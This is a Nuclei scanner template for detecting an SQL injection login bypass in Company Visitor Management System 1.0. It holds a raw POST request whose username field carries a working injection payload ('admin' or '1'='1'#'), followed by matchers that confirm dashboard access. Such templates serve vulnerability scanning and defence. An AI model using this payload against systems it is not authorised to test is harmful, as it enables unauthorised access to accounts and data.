id: cvms-sqli
info:
  author: arafatansari
  description: 'Company Visitor Management System Login page can be bypassed with
    a simple SQLi to the username parameter.

    '
  metadata:
    verified: true
  name: Company Visitor Management System (CVMS) 1.0 - SQLi Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/48884
  severity: high
  tags: cvms,sqli,auth-bypass,cms
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Admin user
    - Dashboard
    - CVMS
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin%27+or+%271%27%3D%271%27%23&password=nuclei&login=

    '
  redirects: true
